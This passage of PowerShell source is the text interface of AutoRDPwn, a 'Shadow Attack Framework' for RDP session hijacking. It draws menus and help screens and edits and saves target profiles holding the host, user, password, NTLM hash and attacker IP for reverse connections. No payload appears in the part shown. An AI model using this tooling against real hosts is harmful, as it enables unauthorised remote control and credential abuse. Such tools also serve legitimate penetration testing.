        [int]$Row = -1,
        [int]$Column = 0,
        [string]$Initial = '',
        [int]$MaxLength = 40,
        [scriptblock]$OnChange = $null
    )
    if ($script:ARTestMode) { return $Initial }
    $buffer = [string]$Initial
    if ($buffer.Length -gt $MaxLength) { $buffer = $buffer.Substring(0, $MaxLength) }
    try {
        try { [Console]::CursorVisible = $true } catch { }
        while ($true) {
            if ($Row -ge 0) {
                try { [Console]::SetCursorPosition($Column + $buffer.Length, $Row) } catch { }
            }
            $key = [Console]::ReadKey($true)
            if ($key.Key -eq 'Enter') { return $buffer }
            if ($key.Key -eq 'Escape') { return $null }
            if ($key.Key -eq 'Delete') {
                $buffer = ''
            }
            elseif ($key.Key -eq 'Backspace') {
                if ($buffer.Length -gt 0) { $buffer = $buffer.Substring(0, $buffer.Length - 1) }
            }
            else {
                $character = $key.KeyChar
                if ($character -and -not [char]::IsControl($character) -and $buffer.Length -lt $MaxLength) {
                    $buffer += $character.ToString()
                }
            }
            if ($null -ne $OnChange) {
                try { & $OnChange $buffer } catch { }
            }
        }
    }
    catch { return $null }
    finally {
        try { [Console]::CursorVisible = $false } catch { }
    }
}

function Get-ARStatusColor {
    switch ($script:ARStatus['Kind']) {
        'Ok' { return 'Green' }
        'Warn' { return 'Yellow' }
        'Error' { return 'Red' }
        default { return 'DarkGray' }
    }
}

function Get-ARCategoryLabel {
    $category = Get-ARCurrentCategory
    if ($null -eq $category) { return '' }
    return [string]$category.Title
}

function Show-ARTuiScreen {
    param([string]$Prompt = '')

    $width = Get-ARConsoleWidth
    $boxWidth = [Math]::Max(40, $width - 1)
    $contentWidth = [Math]::Max(20, $boxWidth - 4)
    $listHeight = Get-ARTuiListHeight
    $script:ARTuiPromptRow = 0

    Initialize-ARTuiState

    $level = $script:ARTuiLevel
    $items = @()
    $selectedIndex = -1
    $scroll = 0
    $detailTitle = ''
    $detailRight = ''
    $detailText = ''
    $noun = Get-ARText 'txt147' 'categories'

    if ($level -eq 'categories') {
        $items = @(Get-ARCategoryListForDisplay)
        $current = Get-ARCurrentCategory
        if ($null -ne $current) {
            for ($i = 0; $i -lt $items.Count; $i++) {
                if ($items[$i].Key -eq $current.Key) { $selectedIndex = $i; break }
            }
            $detailTitle = [string]$current.Title
            $detailRight = Format-ARItemCount -Count $current.Actions.Count -Plural (Get-ARText 'txt146' 'actions')
            $detailText = [string]$current.Description
        }
        $scroll = $script:ARCategoryScroll
    }
    else {
        $noun = Get-ARText 'txt146' 'actions'
        $items = @(Get-ARCurrentActions)
        $current = Get-ARCurrentAction
        if ($null -ne $current) {
            for ($i = 0; $i -lt $items.Count; $i++) {
                if ($items[$i].Id -eq $current.Id) { $selectedIndex = $i; break }
            }
            $detailTitle = [string]$current.Title
            $detailRight = '[' + [string]$current.Id + ']'
            $detailText = [string]$current.Description
        }
        $scroll = $script:ARScroll
    }

    if ($selectedIndex -ge 0) {
        if ($selectedIndex -lt $scroll) { $scroll = $selectedIndex }
        if ($selectedIndex -ge ($scroll + $listHeight)) {
            $scroll = $selectedIndex - $listHeight + 1
        }
    }
    $maxScroll = [Math]::Max(0, $items.Count - $listHeight)
    if ($scroll -gt $maxScroll) { $scroll = $maxScroll }
    if ($scroll -lt 0) { $scroll = 0 }
    if ($level -eq 'categories') { $script:ARCategoryScroll = $scroll }
    else { $script:ARScroll = $scroll }

    Begin-ARTuiCapture

    $adminLabel = if (Test-ARIsAdmin) { 'yes' } else { 'no' }
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - Shadow Attack Framework') -Right ('admin: ' + $adminLabel + '  |  ' + $script:ARLocaleName) -Width $boxWidth -Color 'Yellow'
    $targetLine = 'Target: {0}  User: {1}  Mode: {2}  Session: {3}' -f $script:ARTarget['Computer'], (Get-ARTargetUserLabel), $script:ARTarget['Mode'], $script:ARSessionState
    Write-ARBoxLine $targetLine $boxWidth 'Gray'
    Write-ARBoxBorder $boxWidth

    if ($level -eq 'categories') {
        $breadcrumb = 'AutoRDPwn'
    }
    else {
        $breadcrumb = 'AutoRDPwn > ' + (Get-ARCategoryLabel)
    }
    $counter = '{0}/{1} {2}' -f [Math]::Max(0, ($selectedIndex + 1)), $items.Count, $noun
    $filterLabel = ''
    if ($script:ARFilter -ne '') { $filterLabel = '[/ ' + $script:ARFilter + ']' }
    Write-ARBoxColumns -Left $breadcrumb -Right $filterLabel -Width $boxWidth -Color 'Cyan'

    $ruleLabel = if ($level -eq 'categories') { 'CATEGORIES' } else { 'ACTIONS' }
    Write-ARBoxRule -Width $boxWidth -Label $ruleLabel -Color 'DarkCyan'

    $sessionOpen = Test-ARSessionOpen
    $favoriteIds = @(Get-ARFavorites)
    $sessionBadge = '[session]'

    for ($row = 0; $row -lt $listHeight; $row++) {
        $index = $scroll + $row
        if ($index -ge $items.Count) {
            Write-ARBoxLine '' $boxWidth
            continue
        }
        $item = $items[$index]
        $selected = ($index -eq $selectedIndex)
        $marker = if ($selected) { '>' } else { ' ' }
        if ($level -eq 'categories') {
            $count = Format-ARItemCount -Count $item.Actions.Count -Plural (Get-ARText 'txt146' 'actions')
            $prefix = '{0} {1,2}. ' -f $marker, ($index + 1)
            $text = Format-ARLeader -Label ([string]$item.Title) -Right $count -Width ($contentWidth - $prefix.Length)
            $line = $prefix + $text
        }
        else {
            $pinned = ($favoriteIds -contains [string]$item.Id)
            $pinMark = if ($pinned) { '*' } else { ' ' }
            $prefix = '{0} {1,2}{2} ' -f $marker, ($index + 1), $pinMark
            $idText = '[{0,3}]' -f [string]$item.Id
            $badge = ''
            if ($item.NeedsSession -and -not $sessionOpen) { $badge = $sessionBadge }
            $badgeWidth = 0
            if ($badge -ne '') { $badgeWidth = $badge.Length + 1 }
            $titleWidth = $contentWidth - $prefix.Length - 7 - $badgeWidth
            if ($titleWidth -lt 8) { $titleWidth = 8 }
            $text = Format-ARBoxText ([string]$item.Title) $titleWidth
            $line = $prefix + $idText + ' ' + $text
            if ($badge -ne '') {
                $gap = $contentWidth - $line.Length - $badge.Length
                if ($gap -lt 1) { $gap = 1 }
                $line = $line + (' ' * $gap) + $badge
            }
        }
        if ($selected) {
            Write-ARBoxLine $line $boxWidth 'Black' 'Cyan'
        }
        else {
            Write-ARBoxLine $line $boxWidth 'White'
        }
    }

    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    if ($items.Count -eq 0) {
        Write-ARBoxLine (' ' + (Get-ARText 'txt150' 'No item matches the current filter')) $boxWidth 'DarkGray'
        Write-ARBoxLine '' $boxWidth
        Write-ARBoxLine '' $boxWidth
    }
    else {
        Write-ARBoxColumns -Left $detailTitle -Right $detailRight -Width $boxWidth -Color 'Yellow'
        $descriptionLines = @(Get-ARWrappedLines -Text $detailText -Width ($contentWidth - 2) -MaxLines 2)
        for ($i = 0; $i -lt 2; $i++) {
            if ($i -lt $descriptionLines.Count) {
                Write-ARBoxLine (' ' + $descriptionLines[$i]) $boxWidth 'Gray'
            }
            else {
                Write-ARBoxLine '' $boxWidth
            }
        }
    }

    Write-ARBoxColumns -Left ('Status: ' + [string]$script:ARStatus['Text']) -Right $counter -Width $boxWidth -Color (Get-ARStatusColor)

    if ($Prompt -ne '') {
        if ($null -ne $script:ARTuiCapture) { $script:ARTuiPromptRow = $script:ARTuiCapture.Count }
        else { $script:ARTuiPromptRow = $script:ARTuiFrameLine }
        $filterText = 'Filter: ' + [string]$script:ARFilter
        Write-ARBoxColumns -Left $filterText -Right (Get-ARText 'txt182' 'Enter keep   Esc clear   Del reset') -Width $boxWidth -Color 'Yellow'
        Write-ARBoxLine (' ' + (Get-ARText 'txt181' 'Type to narrow the list: Enter keeps it, Esc clears it')) $boxWidth 'DarkGray'
    }
    else {
        if ($level -eq 'categories') {
            Write-ARBoxLine (' ' + (Get-ARText 'txt178' 'Up/Down move   Enter open   digits select   / filter   F pin   R clear')) $boxWidth 'DarkGray'
        }
        else {
            Write-ARBoxLine (' ' + (Get-ARText 'txt179' 'Up/Down move   Enter run   Esc/b back   digits jump   / filter   F pin')) $boxWidth 'DarkGray'
        }
        Write-ARBoxLine (' ' + (Get-ARText 'txt180' 'T target   P profiles   S save   L language   F1 help   Q quit')) $boxWidth 'DarkGray'
    }
    Write-ARBoxBorder $boxWidth

    Out-ARTuiFrame -Screen 'main'
}

function Show-ARHelp {
    param(
        [string]$Level = '',
        [string]$CategoryTitle = ''
    )
    if ([string]::IsNullOrWhiteSpace($Level)) { $Level = $script:ARTuiLevel }
    if ([string]::IsNullOrWhiteSpace($Level)) { $Level = 'categories' }
    if ([string]::IsNullOrWhiteSpace($CategoryTitle)) { $CategoryTitle = Get-ARCategoryLabel }

    $width = Get-ARConsoleWidth
    $boxWidth = [Math]::Max(40, $width - 1)

    Start-ARTuiFrame -Screen 'help'
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left ('AutoRDPwn v' + (Get-ARVersionLabel) + ' - help') -Right ('level: ' + $Level) -Width $boxWidth -Color 'Yellow'
    Write-ARBoxRule -Width $boxWidth -Label 'KEYS' -Color 'DarkCyan'
    if ($Level -eq 'categories') {
        $lines = @(
            'Up / Down / PgUp / PgDn   move between categories',
            'Home / End                first or last category',
            'Enter / Right             open the selected category',
            'Digits                    select a category',
            '/                         filter categories by name',
            'R                         clear the filter',
            'Esc / Backspace           clear the filter, stay on top',
            'T / P / S / L             target, profiles, save, language',
            'F1                        this help',
            'Q / X                     quit'
        )
    }
    else {
        $lines = @(
            'Up / Down / PgUp / PgDn   move between actions',
            'Home / End                first or last action',
            'Enter                     run the selected action',
            'Esc / Backspace / B / Left back to the category list',
            'Digits                    jump by number or by action id',
            '                          (1..n for position, 101..704 for id)',
            '/                         filter actions in this category',
            'F                         pin or unpin the selected action',
            'R                         clear the filter',
            'T / P / S / L             target, profiles, save, language',
            'F1                        this help',
            'Q / X                     quit'
        )
    }
    $height = Get-ARConsoleHeight
    $showNotes = $true
    if ((7 + $lines.Count + 4) -gt ($height - 1)) { $showNotes = $false }
    if ((7 + $lines.Count) -gt ($height - 1)) {
        if ($Level -eq 'categories') {
            $lines = @(
                'Up / Down    move',
                'Enter        open',
                'Digits       select',
                '/            filter',
                'Esc          clear the filter',
                'T/P/S/L      target, profiles, save, language',
                'F1           help',
                'Q / X        quit'
            )
        }
        else {
            $lines = @(
                'Up / Down    move',
                'Enter        run',
                'Esc          back',
                'Digits       jump',
                '/            filter',
                'T/P/S/L      target, profiles, save, language',
                'F1           help',
                'Q / X        quit'
            )
        }
    }
    foreach ($line in $lines) {
        Write-ARBoxLine (' ' + $line) $boxWidth 'Gray'
    }
    if ($showNotes) {
        Write-ARBoxRule -Width $boxWidth -Label 'NOTES' -Color 'DarkCyan'
        if ($Level -eq 'actions' -and $CategoryTitle -ne '') {
            Write-ARBoxLine (' Category: ' + $CategoryTitle) $boxWidth 'Cyan'
        }
        Write-ARBoxLine ' Legacy -option 11..17 maps to the first action of each old group.' $boxWidth 'DarkGray'
        Write-ARBoxLine ' Profiles remember the last used target and reload it at start.' $boxWidth 'DarkGray'
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine '' $boxWidth
    Write-ARBoxLine ' Press any key to return' $boxWidth 'Green'
    Write-ARBoxBorder $boxWidth
    if (-not $script:ARTestMode) {
        try { $null = [Console]::ReadKey($true) } catch { }
    }
}

function Get-ARTargetProfilesPath {
    if (-not [string]::IsNullOrWhiteSpace($script:ARTargetProfilesPath)) {
        return $script:ARTargetProfilesPath
    }
    if (-not [string]::IsNullOrWhiteSpace($script:ARTools)) {
        return (Join-Path $script:ARTools 'targets.json')
    }
    if (-not [string]::IsNullOrWhiteSpace($script:ARRoot)) {
        return (Join-Path $script:ARRoot 'Resources\Tools\targets.json')
    }
    return (Join-Path (Get-Location).Path 'targets.json')
}

function Get-ARTargetProfiles {
    $path = Get-ARTargetProfilesPath
    if (-not (Test-Path -LiteralPath $path)) { return @() }
    try {
        $raw = Get-Content -LiteralPath $path -Raw -ErrorAction Stop
        if ([string]::IsNullOrWhiteSpace($raw)) { return @() }
        $data = $raw | ConvertFrom-Json -ErrorAction Stop
        if ($null -eq $data) { return @() }
        return @($data)
    }
    catch { return @() }
}

function Protect-ARTargetSecret {
    param([string]$Value = '')
    if ([string]::IsNullOrEmpty($Value)) { return '' }
    $secure = ConvertTo-SecureString -String $Value -AsPlainText -Force -ErrorAction Stop
    return (ConvertFrom-SecureString -SecureString $secure -ErrorAction Stop)
}

function Unprotect-ARTargetSecret {
    param([string]$Value = '')
    if ([string]::IsNullOrEmpty($Value)) { return '' }
    try {
        $secure = ConvertTo-SecureString -String $Value -ErrorAction Stop
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        try {
            return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
        }
        finally {
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        }
    }
    catch { return '' }
}

function Get-ARTargetProfileDefaultName {
    $computer = [string]$script:ARTarget['Computer']
    if ([string]::IsNullOrWhiteSpace($computer)) { $computer = 'localhost' }
    $user = [string]$script:ARTarget['User']
    if ([string]::IsNullOrWhiteSpace($user)) { return $computer }
    return ($computer + ' - ' + $user)
}

function Save-ARTargetProfile {
    param([string]$Name = '')
    $profileName = $Name.Trim()
    if ($profileName -eq '') { $profileName = Get-ARTargetProfileDefaultName }
    $profiles = New-Object System.Collections.Generic.List[object]
    foreach ($profile in @(Get-ARTargetProfiles)) {
        if ([string]$profile.Name -ne $profileName) { $profiles.Add($profile) }
    }
    $profiles.Add([pscustomobject]@{
        Name              = $profileName
        Computer          = [string]$script:ARTarget['Computer']
        User              = [string]$script:ARTarget['User']
        PasswordProtected = Protect-ARTargetSecret ([string]$script:ARTarget['Password'])
        HashProtected     = Protect-ARTargetSecret ([string]$script:ARTarget['Hash'])
        Domain            = [string]$script:ARTarget['Domain']
        AttackerIP        = [string]$script:ARTarget['AttackerIP']
        Mode              = [string]$script:ARTarget['Mode']
    })
    $path = Get-ARTargetProfilesPath
    $directory = Split-Path -Parent $path
    if (-not [string]::IsNullOrWhiteSpace($directory) -and -not (Test-Path -LiteralPath $directory)) {
        New-Item -ItemType Directory -Path $directory -Force | Out-Null
    }
    $json = ConvertTo-Json -InputObject $profiles.ToArray() -Depth 3
    Set-Content -LiteralPath $path -Value $json -Encoding UTF8 -ErrorAction Stop
    Set-ARLastProfileName $profileName
    return $profileName
}

function Apply-ARTargetProfile {
    param($Profile)
    if ($null -eq $Profile) { return $false }
    foreach ($key in @('Computer', 'User', 'Domain', 'AttackerIP')) {
        $property = $Profile.PSObject.Properties[$key]
        if ($property) { $script:ARTarget[$key] = [string]$property.Value }
    }
    $modeProperty = $Profile.PSObject.Properties['Mode']
    if ($modeProperty -and ([string]$modeProperty.Value -in @('control', 'view'))) {
        $script:ARTarget['Mode'] = [string]$modeProperty.Value
    }
    $passwordProperty = $Profile.PSObject.Properties['PasswordProtected']
    if ($passwordProperty) {
        $script:ARTarget['Password'] = Unprotect-ARTargetSecret ([string]$passwordProperty.Value)
    }
    $hashProperty = $Profile.PSObject.Properties['HashProtected']
    if ($hashProperty) {
        $script:ARTarget['Hash'] = Unprotect-ARTargetSecret ([string]$hashProperty.Value)
    }
    $nameProperty = $Profile.PSObject.Properties['Name']
    if ($nameProperty -and -not [string]::IsNullOrWhiteSpace([string]$nameProperty.Value)) {
        Set-ARLastProfileName ([string]$nameProperty.Value)
    }
    return $true
}

function Get-ARLastProfilePath {
    $profilesPath = Get-ARTargetProfilesPath
    $directory = Split-Path -Parent $profilesPath
    if ([string]::IsNullOrWhiteSpace($directory)) {
        if (-not [string]::IsNullOrWhiteSpace($script:ARRoot)) { $directory = $script:ARRoot }
        else { $directory = (Get-Location).Path }
    }
    return (Join-Path $directory 'last.json')
}

function Get-ARLastState {
    $state = @{}
    try {
        $path = Get-ARLastProfilePath
        if (-not (Test-Path -LiteralPath $path)) { return $state }
        $raw = Get-Content -LiteralPath $path -Raw -ErrorAction Stop
        if ([string]::IsNullOrWhiteSpace($raw)) { return $state }
        $data = $raw | ConvertFrom-Json -ErrorAction Stop
        if ($null -eq $data) { return $state }
        if ($data -isnot [System.Management.Automation.PSCustomObject]) { return $state }
        foreach ($property in $data.PSObject.Properties) {
            if ([string]::IsNullOrWhiteSpace($property.Name)) { continue }
            $state[[string]$property.Name] = $property.Value
        }
    }
    catch { }
    return $state
}

function Save-ARLastState {
    param([hashtable]$State)
    if ($null -eq $State) { return }
    try {
        $payload = [pscustomobject]$State
        Set-Content -LiteralPath (Get-ARLastProfilePath) -Value (ConvertTo-Json -InputObject $payload -Depth 3) -Encoding UTF8 -ErrorAction Stop
    }
    catch { }
}

function Set-ARLastProfileName {
    param([string]$Name = '')
    if ([string]::IsNullOrWhiteSpace($Name)) { return }
    $state = Get-ARLastState
    $state['Name'] = $Name
    $state['Saved'] = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    Save-ARLastState -State $state
}

function Set-ARLastLanguage {
    param([string]$Name = '')
    if ([string]::IsNullOrWhiteSpace($Name)) { return }
    $state = Get-ARLastState
    $state['Language'] = $Name
    if (-not $state.ContainsKey('Saved')) {
        $state['Saved'] = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
    }
    Save-ARLastState -State $state
}

function Get-ARLastLanguage {
    $state = Get-ARLastState
    if ($state.ContainsKey('Language')) { return [string]$state['Language'] }
    return ''
}

function Get-ARLastProfileName {
    try {
        $path = Get-ARLastProfilePath
        if (-not (Test-Path -LiteralPath $path)) { return '' }
        $data = Get-Content -LiteralPath $path -Raw -ErrorAction Stop | ConvertFrom-Json -ErrorAction Stop
        if ($data -and $data.PSObject.Properties['Name']) { return [string]$data.Name }
    }
    catch { }
    return ''
}

function Restore-ARLastProfile {
    $name = Get-ARLastProfileName
    if ([string]::IsNullOrWhiteSpace($name)) { return $false }
    foreach ($profile in @(Get-ARTargetProfiles)) {
        if ([string]$profile.Name -ne $name) { continue }
        if (Apply-ARTargetProfile $profile) {
            Set-ARStatus ((Get-ARText 'txt148' 'Last profile loaded') + ': ' + $name) 'Info'
            return $true
        }
    }
    Set-ARStatus ((Get-ARText 'txt148' 'Last profile loaded') + ': ' + $name + ' (missing)') 'Warn'
    return $false
}

function Save-ARCurrentTarget {
    try {
        $name = Save-ARTargetProfile
        Set-ARStatus ((Get-ARText 'txt133' 'Target saved') + ': ' + $name) 'Ok'
        return $true
    }
    catch {
        Set-ARStatus ((Get-ARText 'txt135' 'Could not save target') + ': ' + $_.Exception.Message) 'Error'
        return $false
    }
}

function Show-ARTargetProfilesScreen {
    param(
        [object[]]$Profiles,
        [int]$Index = 0
    )
    $width = Get-ARConsoleWidth
    $height = Get-ARConsoleHeight
    $boxWidth = [Math]::Max(40, $width - 1)
    $contentWidth = [Math]::Max(20, $boxWidth - 4)
    $listHeight = [Math]::Max(3, $height - 9)
    if ($Index -lt 0) { $Index = 0 }
    if ($Index -ge $Profiles.Count) { $Index = $Profiles.Count - 1 }
    $scroll = 0
    if ($Index -ge $listHeight) { $scroll = $Index - $listHeight + 1 }

    Start-ARTuiFrame -Screen 'profiles'
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left (Get-ARText 'txt136' 'Saved target profiles') -Right (Format-ARItemCount -Count $Profiles.Count -Plural 'profiles') -Width $boxWidth -Color 'Yellow'
    Write-ARBoxRule -Width $boxWidth -Label 'PROFILES' -Color 'DarkCyan'
    for ($row = 0; $row -lt $listHeight; $row++) {
        $profileIndex = $scroll + $row
        if ($profileIndex -ge $Profiles.Count) {
            Write-ARBoxLine '' $boxWidth
            continue
        }
        $profile = $Profiles[$profileIndex]
        $name = [string]$profile.Name
        if ([string]::IsNullOrWhiteSpace($name)) { $name = '(unnamed)' }
        $hostName = [string]$profile.Computer
        if ([string]::IsNullOrWhiteSpace($hostName)) { $hostName = 'localhost' }
        $marker = if ($profileIndex -eq $Index) { '>' } else { ' ' }
        $prefix = '{0} {1,2}. ' -f $marker, ($profileIndex + 1)
        $line = $prefix + (Format-ARLeader -Label $name -Right $hostName -Width ($contentWidth - $prefix.Length))
        if ($profileIndex -eq $Index) {
            Write-ARBoxLine $line $boxWidth 'Black' 'Cyan'
        }
        else {
            Write-ARBoxLine $line $boxWidth 'White'
        }
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    $selected = $Profiles[$Index]
    $selectedUser = [string]$selected.User
    if ([string]::IsNullOrWhiteSpace($selectedUser)) { $selectedUser = '(current user)' }
    Write-ARBoxLine (' {0}  |  user: {1}  |  mode: {2}' -f $selected.Computer, $selectedUser, $selected.Mode) $boxWidth 'White'
    Write-ARBoxLine (' ' + (Get-ARText 'txt123' 'Your IP for the reverse connection') + ': ' + ([string]$selected.AttackerIP)) $boxWidth 'Gray'
    Write-ARBoxLine ' Up/Down move   Enter load   Esc cancel' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Show-ARTargetPicker {
    $profiles = @(Get-ARTargetProfiles)
    if ($profiles.Count -eq 0) {
        Set-ARStatus (Get-ARText 'txt132' 'No saved targets. Edit a target and press S to save it.') 'Warn'
        return $false
    }
    $index = 0
    for ($i = 0; $i -lt $profiles.Count; $i++) {
        if ([string]$profiles[$i].Computer -eq [string]$script:ARTarget['Computer'] -and
            [string]$profiles[$i].User -eq [string]$script:ARTarget['User']) {
            $index = $i
            break
        }
    }
    while ($true) {
        Show-ARTargetProfilesScreen -Profiles $profiles -Index $index
        if ($script:ARTestMode) { return $false }
        try { $key = [Console]::ReadKey($true) } catch { return $false }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $profiles.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $profiles.Count) { $index = 0 }
            }
            'Home' { $index = 0 }
            'End' { $index = $profiles.Count - 1 }
            'Enter' {
                $null = Apply-ARTargetProfile $profiles[$index]
                Set-ARStatus ((Get-ARText 'txt134' 'Target loaded') + ': ' + [string]$profiles[$index].Name) 'Ok'
                return $true
            }
            'Escape' { return $false }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'Q') { return $false }
            }
        }
    }
}

function Show-ARTargetFormScreen {
    param([int]$Index)
    $width = Get-ARConsoleWidth
    $boxWidth = [Math]::Max(40, $width - 1)
    $contentWidth = [Math]::Max(20, $boxWidth - 4)
    $fields = @(
        @{ Key = 'Computer'; Label = 'Target host' },
        @{ Key = 'User'; Label = 'User' },
        @{ Key = 'Password'; Label = 'Password' },
        @{ Key = 'Hash'; Label = 'NTLM hash' },
        @{ Key = 'Domain'; Label = 'Domain' },
        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
        @{ Key = 'Mode'; Label = 'Mode' }
    )
    Start-ARTuiFrame -Screen 'target'
    Write-ARBoxBorder $boxWidth
    Write-ARBoxColumns -Left 'Target editor' -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
    Write-ARBoxRule -Width $boxWidth -Label 'TARGET' -Color 'DarkCyan'
    for ($i = 0; $i -lt $fields.Count; $i++) {
        $field = $fields[$i]
        $value = [string]$script:ARTarget[$field.Key]
        if ($field.Key -eq 'Password' -and $value -ne '') { $value = '********' }
        if ($field.Key -eq 'Hash' -and $value -ne '') {
            if ($value.Length -gt 16) { $value = $value.Substring(0, 16) + '...' }
        }
        if ($field.Key -eq 'AttackerIP' -and $value -eq '') { $value = 'auto' }
        if ($field.Key -eq 'User' -and $value -eq '') { $value = '(current user)' }
        if ($value -eq '') { $value = '(not set)' }
        $marker = if ($i -eq $Index) { '>' } else { ' ' }
        $prefix = '{0} ' -f $marker
        $line = $prefix + (Format-ARLeader -Label ('{0,-12} :' -f $field.Label) -Right $value -Width ($contentWidth - $prefix.Length) -Fill ' ')
        if ($i -eq $Index) {
            Write-ARBoxLine $line $boxWidth 'Black' 'Cyan'
        }
        else {
            Write-ARBoxLine $line $boxWidth 'White'
        }
    }
    Write-ARBoxRule -Width $boxWidth -Label '' -Color 'DarkCyan'
    Write-ARBoxLine (' Status: ' + [string]$script:ARStatus['Text']) $boxWidth (Get-ARStatusColor)
    Write-ARBoxLine ' Up/Down move   Enter edit   P profiles   S save   Esc cancel' $boxWidth 'DarkGray'
    Write-ARBoxBorder $boxWidth
}

function Read-ARLineValue {
    param([string]$Prompt)
    $restoreHidden = $script:ARTuiFrameActive
    if ($restoreHidden) { try { [Console]::CursorVisible = $true } catch { } }
    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
    try { return $Host.UI.ReadLine() }
    catch { return $null }
    finally {
        if ($restoreHidden) { try { [Console]::CursorVisible = $false } catch { } }
    }
}

function Read-ARSecretValue {
    param([string]$Prompt)
    $restoreHidden = $script:ARTuiFrameActive
    if ($restoreHidden) { try { [Console]::CursorVisible = $true } catch { } }
    Write-Host $Prompt -NoNewline -ForegroundColor Yellow
    try {
        $secure = $Host.UI.ReadLineAsSecureString()
        if ($null -eq $secure) { return '' }
        $bstr = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure)
        try {
            return [Runtime.InteropServices.Marshal]::PtrToStringBSTR($bstr)
        }
        finally {
            [Runtime.InteropServices.Marshal]::ZeroFreeBSTR($bstr)
        }
    }
    catch { return '' }
    finally {
        if ($restoreHidden) { try { [Console]::CursorVisible = $false } catch { } }
    }
}

function Edit-ARTargetField {
    param([hashtable]$Field)
    if ($Field.Key -eq 'Mode') {
        if ($script:ARTarget['Mode'] -eq 'control') { $script:ARTarget['Mode'] = 'view' }
        else { $script:ARTarget['Mode'] = 'control' }
        return
    }
    if ($Field.Key -eq 'Password') {
        $value = Read-ARSecretValue ' New password (Enter keeps, - clears): '
        if ($null -eq $value) { return }
        if ($value -eq '-') { $script:ARTarget['Password'] = '' }
        elseif ($value -ne '') { $script:ARTarget['Password'] = $value }
        return
    }
    $current = [string]$script:ARTarget[$Field.Key]
    $value = Read-ARLineValue (' {0} [{1}]: ' -f $Field.Label, $current)
    if ($null -eq $value) { return }
    $value = $value.Trim()
    if ($value -eq '') {
        if ($Field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
        elseif ($Field.Key -eq 'User') { $script:ARTarget['User'] = '' }
        else { $script:ARTarget[$Field.Key] = '' }
        return
    }
    if ($Field.Key -eq 'Mode') {
        if ($value -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
        elseif ($value -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
        return
    }
    $script:ARTarget[$Field.Key] = $value
}

function Show-ARTargetForm {
    $fields = @(
        @{ Key = 'Computer'; Label = 'Target host' },
        @{ Key = 'User'; Label = 'User' },
        @{ Key = 'Password'; Label = 'Password' },
        @{ Key = 'Hash'; Label = 'NTLM hash' },
        @{ Key = 'Domain'; Label = 'Domain' },
        @{ Key = 'AttackerIP'; Label = 'Attacker IP' },
        @{ Key = 'Mode'; Label = 'Mode' }
    )
    $index = 0
    while ($true) {
        Show-ARTargetFormScreen -Index $index
        if ($script:ARTestMode) { return $false }
        try { $key = [Console]::ReadKey($true) } catch { return $false }
        switch ($key.Key) {
            'UpArrow' {
                $index--
                if ($index -lt 0) { $index = $fields.Count - 1 }
            }
            'DownArrow' {
                $index++
                if ($index -ge $fields.Count) { $index = 0 }
            }
            'Home' { $index = 0 }
            'End' { $index = $fields.Count - 1 }
            'Enter' {
                Edit-ARTargetField -Field $fields[$index]
            }
            'Escape' { return $true }
            default {
                $character = $key.KeyChar.ToString().ToUpperInvariant()
                if ($character -eq 'S') { $null = Save-ARCurrentTarget }
                if ($character -eq 'P') { $null = Show-ARTargetPicker }
                if ($character -eq 'Q') { return $false }
            }
        }
    }
}

function Read-ARLineTargetForm {
    $labels = @(
        @{ Key = 'Computer'; Text = 'Target host' },
        @{ Key = 'User'; Text = 'User' },
        @{ Key = 'Hash'; Text = 'NTLM hash' },
        @{ Key = 'Domain'; Text = 'Domain' },
        @{ Key = 'AttackerIP'; Text = 'Attacker IP' }
    )
    foreach ($field in $labels) {
        $current = [string]$script:ARTarget[$field.Key]
        $value = Read-ARLineValue (' {0} [{1}]: ' -f $field.Text, $current)
        if ($null -eq $value) { continue }
        $value = $value.Trim()
        if ($value -ne '') { $script:ARTarget[$field.Key] = $value }
        elseif ($field.Key -eq 'Computer') { $script:ARTarget['Computer'] = 'localhost' }
    }
    $password = Read-ARSecretValue ' New password (Enter keeps, - clears): '
    if ($null -ne $password) {
        if ($password -eq '-') { $script:ARTarget['Password'] = '' }
        elseif ($password -ne '') { $script:ARTarget['Password'] = $password }
    }
    $mode = Read-ARLineValue (' Mode [1 control, 2 view] [{0}]: ' -f $script:ARTarget['Mode'])
    if ($null -ne $mode) {
        $mode = $mode.Trim()
        if ($mode -match '^1$|control') { $script:ARTarget['Mode'] = 'control' }
        elseif ($mode -match '^2$|view') { $script:ARTarget['Mode'] = 'view' }
    }
}

function Show-ARLanguagePicker {
    $languages = @('English', 'Spanish', 'French', 'German', 'Italian', 'Russian', 'Portuguese')
    $index = [Array]::IndexOf($languages, $script:ARLocaleName)
    if ($index -lt 0) { $index = 0 }
    while ($true) {
        $width = Get-ARConsoleWidth
        $boxWidth = [Math]::Max(40, $width - 1)
        Start-ARTuiFrame -Screen 'language'
        Write-ARBoxBorder $boxWidth
        Write-ARBoxColumns -Left 'Language' -Right $script:ARLocaleName -Width $boxWidth -Color 'Yellow'
        Write-ARBoxRule -Width $boxWidth -Label 'LANGUAGES' -Color 'DarkCyan'
        for ($i = 0; $i -lt $languages.Count; $i++) {
            $marker = if ($i -eq $index) { '>' } else { ' ' }
            $line = ' {0} {1,2}. {2}' -f $marker, ($i + 1), $languages[$i]
